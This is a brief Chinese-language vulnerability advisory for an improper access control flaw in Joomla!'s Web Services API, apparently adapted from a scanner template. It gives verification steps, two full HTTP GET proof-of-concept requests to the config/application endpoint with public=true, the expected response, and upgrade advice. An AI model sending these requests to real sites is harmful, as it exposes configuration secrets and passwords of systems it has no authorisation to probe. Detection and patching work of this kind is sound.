验证漏洞存在方法
    - 访问目标Joomla!网站的API端点：{{BaseURL}}/api/index.php/v1/config/application?public=true 或 {{BaseURL}}/api/v1/config/application?public=true
    - 检查响应状态码是否为200
    - 检查响应头是否包含"application/json"或"application/vnd.api+json"
    - 检查响应体是否包含"links"和"attributes"字段

漏洞利用方法
    - 该漏洞是Joomla! Web服务中的访问控制不当问题，允许未经授权访问Web服务端点
    - 通过向特定API端点发送GET请求，可以获取配置信息，可能导致敏感信息泄露
    - 攻击者可以利用此漏洞获取用户密码等敏感信息，危害用户账户的机密性

PoC:
```http
GET /api/index.php/v1/config/application?public=true HTTP/1.1
Host: {{BaseURL}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close

或

GET /api/v1/config/application?public=true HTTP/1.1
Host: {{BaseURL}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```

预期响应：
- 状态码：200
- 响应头：Content-Type: application/json 或 application/vnd.api+json
- 响应体：包含"links"和"attributes"字段的JSON数据

修复建议：
- 升级到Joomla! 4.2.8或更高版本
- 应用官方安全补丁
